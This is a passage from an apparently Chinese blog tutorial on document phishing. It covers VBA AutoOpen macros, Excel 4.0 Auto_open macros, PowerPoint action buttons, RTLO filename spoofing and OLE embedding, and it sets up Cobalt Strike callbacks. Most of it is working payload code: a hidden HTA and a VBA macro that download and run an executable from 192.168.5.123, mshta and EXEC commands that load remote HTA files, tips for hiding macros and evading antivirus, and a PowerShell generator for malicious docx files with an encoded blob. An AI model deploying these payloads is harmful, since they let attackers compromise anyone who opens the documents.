CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">    Locator.Run&quot;powershell.exe &quot;&quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.5.123:801&#x2F;test666.exe&#39;,&#39;c:\\windows\\temp\\file.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;c:\\windows\\temp\\file.exe&#39;)&quot;&quot;&quot;,0,FALSE</span><br><span class="line">    window.close()</span><br><span class="line">end sub</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>​        将这个hta文件挂载到web上，再编辑test.html,内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;cmd|&#39;&#x2F;c mshta http:&#x2F;&#x2F;192.168.5.123:8045&#x2F;test.hta &#39;!A0</span><br></pre></td></tr></table></figure>

<p>​        将这个test.html也挂载到web上，创建excel并且以IQY的方式加载</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802122258718.png" alt="image-20200802122258718"></p>
<p>​        导入后执行即可加载自定义马上线</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802122406508.png" alt="image-20200802122406508"></p>
<h3 id="office宏钓鱼"><a href="#office宏钓鱼" class="headerlink" title="office宏钓鱼"></a>office宏钓鱼</h3><p><strong>什么是office宏？</strong></p>
<p>​    宏是一个批量处理程序命令，正确地运用它可以提高工作效率。微软的office软件允许用户自己编写，叫VBA的脚本来增加其灵活性，进一步扩充它的能力。</p>
<p><strong>如何使用宏？</strong></p>
<p>​    首先创建一个word文档，在视图中找到宏</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802132149194.png" alt="image-20200802132149194"></p>
<p>​    <img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802133045765.png" alt="image-20200802133045765"></p>
<p>​        点击创建后即可创建office宏，创建好后即可进入编写界面</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802133523226.png" alt="image-20200802133523226"></p>
<p>​    在office宏中使用VBA来进行编程，Visual Basic for Applications(VBA)是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。</p>
<p>​    我们以运行helloworld为例，代码如下</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802134015879.png" alt="image-20200802134015879"></p>
<p>​    执行后即可弹窗</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802134034327.png" alt="image-20200802134034327"></p>
<h4 id="CS上线-5"><a href="#CS上线-5" class="headerlink" title="CS上线"></a>CS上线</h4><p>​    首先在CS上生成宏代码</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802135822707.png" alt="image-20200802135822707"></p>
<p>​    复制生成的代码，创建一个word文件，编辑宏，将原本的内容进行替换</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802140047661.png" alt="image-20200802140047661"></p>
<p>​    保存的时候选否，将文件另存为docm文件。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802140406510.png" alt="image-20200802140406510"></p>
<p>​    <img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802140502196.png" alt="image-20200802140502196"></p>
<p>​    当目标打开文件并且点击启用宏，即可上线</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802140727491.png" alt="image-20200802140727491"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802140746213.png" alt="image-20200802140746213"></p>
<p>​    <strong>使用office宏在高版本的windows+office中也可以正常上线，使用CS直接生成的代码生成的DOCM文件会被360直接干掉。</strong></p>
<p><strong>如何上线自定义马？</strong></p>
<p>​    首先将自己生成的免杀的马传到服务器上，再通过编写VBA的脚本远程加载自己生成的马，即可实现自定义马的上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">Dim xHttp: Set xHttp &#x3D; CreateObject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">Dim bStrm: Set bStrm &#x3D; CreateObject(&quot;Adodb.Stream&quot;)</span><br><span class="line">xHttp.Open &quot;GET&quot;, &quot;http:&#x2F;&#x2F;192.168.3.29&#x2F;test666.exe&quot;, False</span><br><span class="line">xHttp.Send</span><br><span class="line">With bStrm</span><br><span class="line"> .Type &#x3D; 1 &#39;&#x2F;&#x2F;binary</span><br><span class="line"> .Open</span><br><span class="line"> .write xHttp.responseBody</span><br><span class="line"> .savetofile &quot;c:\windows\temp\test666.exe&quot;, 2 &#39;&#x2F;&#x2F;overwrite</span><br><span class="line">End With</span><br><span class="line">Shell (&quot;c:\windows\temp\test666.exe&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<p>​    将上面的内容保存在宏中即可实现自定义马的上线。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802142530113.png" alt="image-20200802142530113"></p>
<h3 id="PPT动作按钮"><a href="#PPT动作按钮" class="headerlink" title="PPT动作按钮"></a>PPT动作按钮</h3><p><strong>如何使用PPT动作按钮？</strong></p>
<p>​    首先创建一个ppt文档，选择”插入”-&gt;”形状”-&gt;”动作按钮”，选择那个空白的</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802143447935.png" alt="image-20200802143447935"></p>
<p>​    在弹出的框中选择鼠标悬停时运行的程序</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802143958779.png" alt="image-20200802143958779"></p>
<p>​    生成后这个动作按钮是一个有色的内容，所以我们要对他进行简单的处理。对着这个有色块右键选择“设置形状格式”，将线条和填充都选择为无</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802144414120.png" alt="image-20200802144414120"></p>
<p>​    最后将这个文件保存，当目标打开这个PPT，选择播放，并且将鼠标移动到指定位置时，会弹出一个框，点击启用后会执行我们插入的程序。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802144700670.png" alt="image-20200802144700670"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802144714090.png" alt="image-20200802144714090"></p>
<p>·    <strong>经过测试，PPT动作按钮在高版本的windows+office上无法使用。</strong></p>
<h4 id="CS上线-6"><a href="#CS上线-6" class="headerlink" title="CS上线"></a>CS上线</h4><p>​    使用CS生成一个HTA文件，挂载到web上</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802145513602.png" alt="image-20200802145513602"></p>
<p>​    </p>
<p>​    再使用mshta进行加载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\mshta.exe http:&#x2F;&#x2F;192.168.5.123:803&#x2F;test.hta</span><br></pre></td></tr></table></figure>

<p>​    将上面的内容插入到动作按钮中，当目标鼠标移动到按钮上并且点击了启用，即可上线</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802145933248.png" alt="image-20200802145933248"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802152155914.png" alt="image-20200802152155914"></p>
<p><strong>如何自定义马上线？</strong></p>
<p>​    首先生成一个自定义的exe挂载到web上，将下面的代码保存成hta，放在web服务上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Sub window_onload</span><br><span class="line"> window.resizeTo 0,0</span><br><span class="line"> window.MoveTo -100,-100</span><br><span class="line">const impersonation &#x3D; 3</span><br><span class="line">Const HIDDEN_WINDOW &#x3D; 12</span><br><span class="line">Set Locator &#x3D; CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line"> Locator.Run&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.5.123:801&#x2F;test666.exe&#39;,&#39;c:\\windows\\temp\\test666.exe&#39;);start-process &#39;c:\\windows\\temp\\test666.exe&#39;&quot;,0,FALSE</span><br><span class="line"> window.close()</span><br><span class="line">end sub</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>​    插入PPT动作按钮，即可当目标使用幻灯片放映ppt，鼠标移动到按钮位置，并且在弹出框中选择启动即可上线。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802153206852.png" alt="image-20200802153206852"></p>
<h3 id="RTLO钓鱼"><a href="#RTLO钓鱼" class="headerlink" title="RTLO钓鱼"></a>RTLO钓鱼</h3><p><strong>什么是RTLO？</strong></p>
<p>​    RIGHT TO LEVER OVERRIDE 是一种 Unicode，主要用于书写和阅读阿拉伯语或希伯来语文本。Unicode 有一个特殊字符 U + 202e，它告诉计算机以从右到左的顺序显示它后面的文本。此漏洞用于伪装文件名称。</p>
<p><strong>如何使用？</strong></p>
<p>​    首先准备一个exe文件，我这里是使用calc.exe</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803100220133.png" alt="image-20200803100220133"></p>
<p>​    对calc.exe进行重命名，命名为calccod.exe并且光标停在两个c中间</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803100418034.png" alt="image-20200803100418034"></p>
<p>​    右键选择-插入 Unicode 字符—选择 RLO，我这里截图有些问题，因此使用网上的截图。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803100540243.png" alt="image-20200803100540243"></p>
<p>​    插入后显示如下</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803101054470.png" alt="image-20200803101054470"></p>
<p>​    虽然最后显示的doc后缀，但是实际上是一个exe文件</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803101204328.png" alt="image-20200803101204328"></p>
<p>​    但是使用这样的文件会被defender当作病毒杀掉，而且也会被360查杀</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803101356817.png" alt="image-20200803101356817"></p>
<h3 id="Excel-4-0宏钓鱼"><a href="#Excel-4-0宏钓鱼" class="headerlink" title="Excel 4.0宏钓鱼"></a>Excel 4.0宏钓鱼</h3><p><strong>什么是excel 4.0宏？</strong></p>
<p>​    总结来说excel4.0宏是一个出现比较早的技术，和其他的宏一样可以通过编写宏来实现自动化处理数据的目的，但是由于excel4.0宏被VBA的宏替代，所以excel4.0宏很少被知道。</p>
<h4 id="命令执行-5"><a href="#命令执行-5" class="headerlink" title="命令执行"></a>命令执行</h4><p>​    了解了什么是excel 4.0宏，我们看下如何创建excel 4.0宏并且通过宏来执行命令。</p>
<p>​    新建一个excel文件，在表那右键选择插入</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803112859434.png" alt="image-20200803112859434"></p>
<p>在弹出的框中选择MS Excel 4.0宏表</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803113013722.png" alt="image-20200803113013722"></p>
<p>​    点击确定后会创建一个新的表格，在表格中输入如下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;EXEC(&quot;calc.exe&quot;)</span><br><span class="line">&#x3D;HALT()</span><br></pre></td></tr></table></figure>

<p>​    编辑好后我们先手动运行进行测试，对着这个表格右键选择执行</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803113811925.png" alt="image-20200803113811925"></p>
<p>​    在弹出的窗口选择执行，即可执行命令</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803113943894.png" alt="image-20200803113943894"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803113928720.png" alt="image-20200803113928720"></p>
<p>​    如果我们想要打开这个表时自动运行，可以将这个表格的第一个单元格重命名为”Auto_open“</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803114407956.png" alt="image-20200803114407956"></p>
<p>​    如果要隐藏宏，右击这个宏表格选择隐藏</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803114508630.png" alt="image-20200803114508630"></p>
<p>​    当我们保存这个文件时，会弹出一个框问是否保存为未启用宏的文件，我们选择否</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803114856915.png" alt="image-20200803114856915"></p>
<p>​    将文件另存为xlsm格式</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803114932893.png" alt="image-20200803114932893"></p>
<p>​    当再打开这个xlsm文件，会有一个宏被禁用的窗口，当点击启用命令会被执行</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803115023554.png" alt="image-20200803115023554"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803115032326.png" alt="image-20200803115032326"></p>
<p>​    如果觉得保存为xlsm比较显眼，也可以保存为97-2003工作薄，看上去还是xls格式。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803120900500.png" alt="image-20200803120900500"></p>
<p><strong>是否会受到windows或者office版本的影响？</strong></p>
<p>​    经过测试，即使是高版本的windows+office，启用宏后仍然会导致命令执行。但是因为使用了宏会被360查杀</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803115447871.png" alt="image-20200803115447871"></p>
<h4 id="CS上线-7"><a href="#CS上线-7" class="headerlink" title="CS上线"></a>CS上线</h4><p>​    首先使用CS生成一个hta文件，并且挂载到web上</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803115733073.png" alt="image-20200803115733073"></p>
<p>​    创建excel文件，创建Excel 4.0宏输入如下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;EXEC(&quot;C:\Windows\System32\mshta.exe  http:&#x2F;&#x2F;192.168.5.123:8045&#x2F;test.hta&quot;)</span><br><span class="line">&#x3D;HALT()</span><br></pre></td></tr></table></figure>

<p>​    再将第一个单元格重命名为”Auto_open“，将宏表设置为隐藏，最后保存文件为xlsm格式，目标打开后并且点击开启即可上线。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803120427727.png" alt="image-20200803120427727"></p>
<h3 id="office嵌入对象钓鱼"><a href="#office嵌入对象钓鱼" class="headerlink" title="office嵌入对象钓鱼"></a>office嵌入对象钓鱼</h3><p>​    这种方法本质上也是OLE的钓鱼，不过使用这种方式嵌入的内容不同</p>
<h4 id="Shell-Explorer-1"><a href="#Shell-Explorer-1" class="headerlink" title="Shell.Explorer.1"></a><strong>Shell.Explorer.1</strong></h4><p>​    Shell.Explorer.1 OLE对象（CLSID {EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B}）常用于嵌入式Windows资源管理器或嵌入式Internet Explorer。我们可以将这个OLE对象嵌入Office文档中，并作为持久对象保存在相应的文档中。我们可以使用Shell.Explorer.1嵌入Internet Explorer，通过这种方式执行远程或者本地的文件</p>
<p>​    我们可以使用如下的powershell脚本来生成恶意的docx文件,我这里执行的是加载本地的计算器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># target file path</span><br><span class="line">$filename &#x3D; [Environment]::GetFolderPath(&#39;Desktop&#39;) + &#39;\WebBrowser.docx&#39;</span><br><span class="line"></span><br><span class="line"># path to open</span><br><span class="line">$path &#x3D; &#39;c:\windows\system32\calc.exe&#39;</span><br><span class="line">#$path &#x3D; &#39;https:&#x2F;&#x2F;securify.nl&#x2F;blog&#x2F;SFY20180801&#x2F;thisisfine.url&#39;</span><br><span class="line"></span><br><span class="line"># the temp file is used for creating the icon</span><br><span class="line">$tmpfile &#x3D; &quot;$env:TEMP\Totally Safe.txt&quot;</span><br><span class="line"></span><br><span class="line"># load assemblies for changing the docx (zip) file</span><br><span class="line">[void] [Reflection.Assembly]::LoadWithPartialName(&#39;System.IO.Compression.FileSystem&#39;)</span><br><span class="line">[void] [Reflection.Assembly]::LoadWithPartialName(&#39;System.IO.Compression&#39;)</span><br><span class="line"></span><br><span class="line"># load PropertyStore (copied from https:&#x2F;&#x2F;github.com&#x2F;FuzzySecurity&#x2F;PowerShell-Suite&#x2F;blob&#x2F;master&#x2F;Export-LNKPwn.ps1)</span><br><span class="line">$EncodedCompressedFile &#x3D; &#39;7VoNcFxXdT7v7e7bH0uKdiXLsq2fZ1u215K9lmQ5&#x2F;omTWL+OgmQZraxIwdRerZ6ktVe78tuVHTs4cZqQSQYljRn+&#x2F;w0MYCYp0FL+CiGhwIQCpWkKZdoOpKUDLdNSoMyEv0n6nXPf2139OA4ZWoYZnvS+e8+55557zrnn3nff7g7e&#x2F;gh5iMiL+4UXiD5F6jpI174u4q5o&#x2F;EwFfTz49Q2f0ga+vmFkJpUz5+zstJ2YNZOJTCabNycs057PmKmM2TMUN2ezk1asvDzU5Og40ks0oHnoE89fHHf1PksbzVVaK1EziIDi3d8PMHGfELJS6rqymy&#x2F;D7fwexefLQydey6L8XywLhVwd0DtESu8JLy2&#x2F;4GQZil8fIqp7CTEpXGbBdLkCoG8poWN56448yoVtjl&#x2F;NRbtLVJyI2Tk7SY5tsFEc3b5Y7iD+Y7aVziaVrTIxrKt9mVzXUjNn+lV5i3Tx0aPQfWQ9kfaSnFx+3apHd8BIPRcmCkVhrNG832F5FElU1eqht5KMEc4BjJD+cKphZ62N+hyqC2vQFo1AQa4KcF6viVajXIWmk&#x2F;7MzgY7Bzn&#x2F;AltZkF5dlF4XhZ6WKALQUklO37KWbXoU82eUG1kfimC2Flw9sJJoYP3uZ9hMsTOmQhluCNWsaqk19Cj39mfXQjALaWMs5F8ztsqv+Nl1YLf&#x2F;o9HcoN8Jxd7mjbrnglSgy0eTxDlJ4XUhPYvpNB5qgOWrVD0Kb0I1&#x2F;pp1bGWopqwlplQGZKjyYLYFRI0fhvOoIuTUx0KBNWNlgVILvuhvZtunSNZHOFcPZgi2b2cJDBraYtj&#x2F;wbGWoSWQ2UZhZ00u4GrdYlc3MEjPZe5+y5BW+Bw1eX5HVYnpLufCG21kbl9jUI82cCd25OHUGMdId2MklVCN5IaPboPd0B&#x2F;Ws&#x2F;VulEKqrqJkOFHSo2VF3jqXVxikxlgypooaz4VXYsOXxGZzaWg222s1Dk394tBsVqHZbL+CW2XkFVqd8YrhUrEhGfMhtXzDuSAH5uFUYxA5n9ReLOd5ZZw0OOf&#x2F;EnLG1XJ+M5KexbMS8sZgdKOsl8ZyyW+jsXw86nETvWyzP5CLsZUyMYUF28QLdu3iBSukrIOdzjporHMXQq1kx2Yetb50ITA&#x2F;u8VZCOvMtviROM+1x51rqYDhdRlS4Xl&#x2F;I8bw8xi1mO7qkgVSvWyB6Oy8yytMfQ14ZRE9ulXYDY2VajGVt7Qrs4JibpU37HWXE2r1hfXkEGOh4Jqx8mCpJ0&#x2F;43f3gvS+2pup1TpzqFdeUYce5VexeqXVeWtmDhaqrrMeSiC9bj0Vb3fWo1lKtJs+hcC7i7LONdUi6S&#x2F;pvZ6OV&#x2F;dLIsk+B2AY76EGOZgseBgRLejRWyoyW6w3BmqC7HoO5KDuzRjK3doUNucrbMmxkOTJVRsSwBzFIbhsnK1wMbce0N3OTrwVbYFhqBm&#x2F;uRtjHkxzSw94VdYa963dfMZorGoOcjD43GX0qO2UBlGxlW0u2sgneVpo4UZbsaF16dAvTSInQmrHa21mx4SqWipqTO17y&#x2F;ta0bH9jw0LOODFpaAxeZedbbqKzAfJedPfL3v&#x2F;e7uFEbbpK61eldYuzvVx7Y2Rbfgw7gpyjG9wcvfbGWMxR3hivmaOidPxkILPTtL&#x2F;rKenQML6sC7ZPTphAccssNyTswexOntmHNrLbrezJ1pLttsqLWmBM+voxWCZwcjxV1IG0DHvDvuLOazR&#x2F;QAXfvtHLMWtjhe0MpYErPFt3cTnq7swXsE96de+FgLOZ+tUe6qHrMFaIc+tObtqhVzfr0Z0cVqN2vBeBpzjus7g&#x2F;j&#x2F;tp3I&#x2F;h&#x2F;h7zNHU&#x2F;iPovS2j3vh48nNXJIiXzdqfvWYdeKu&#x2F;evAHdzIe8xoPjvbCM&#x2F;gx3n3b1e7dT7u0EKDdqLk0vYNvTml1yoaGEinbA5YUtpRyej4WtpZzdzFlTyuG8kCwocK5nTrSUs4c520o5e5nTXMrZx5yWpXqi+5m9vdToHeWqtuZSzfOeFm3Nwg5ujd7Aa1caSg6uSzOtWa37a4opCdlR5THiMNT5c8zdd4T3cGrdmLP3SIZED6i9p9bZTVqLvFqHJ&#x2F;221zgOGetcRSX7ysiL7CuHJM95rAUsd33JzvEqdxU4u8TyVdAVv7VLc95M+D3nTEesNbardVfbPhLP0sB3IMU23YVn3iqiR7EqNsXzdioznWOJj2MXyePhvelonKJr1HvgpkNH+3tQ7gVdy21d6eyE4wMirN1W&#x2F;95gkF&#x2F;kfqntohr1XrRD7VeESScsS4JaQqAI00AwlNefvKYxv1bpkX66Ov&#x2F;j+qZPeWHQjPcjhkHfFHwIT4nr6Bv8lkR&#x2F;4akE54CXsV7ws4IPCF4W&#x2F;JrIXPY8ArxbkIT&#x2F;A887fQZNelhnHb1eM+iocdpv0N9oPwZ&#x2F;xM847mV8zscYI8a&#x2F;kvpGg&#x2F;Gk4GbwQ&#x2F;S43gM9FaLnZ9IrKa1vFT1v8LHmI8Jp8zB2GGzD&#x2F;4jknGieFhwQ7Bb8e53xq4Je6fVrjE7OVsLR4r9K6vIMeOoK1M&#x2F;17xjViGJQqHeDqkM8I3QPqDYfUz6ql7b&#x2F;EkkDs8Ftt3u+Y7wSJ8sWaWsQST+81jAJ2zzkH4fGDh5DfwqsZ7S&#x2F;Bf5Ae0Zjzj8A9+rfBW7Uvwdc7&#x2F;k+8NfeH2qGcZf2I2304rz2feCviPEGwXHB44L3CmZF5l+lfkDq2wQ9gj8WfkBQE+wQHBa8IHhG6RT52wR7BAcFvyWtrxdsFM5Xpb7Hz3irYFTwh8J&#x2F;m+AqkWwXnAIeMTn299ee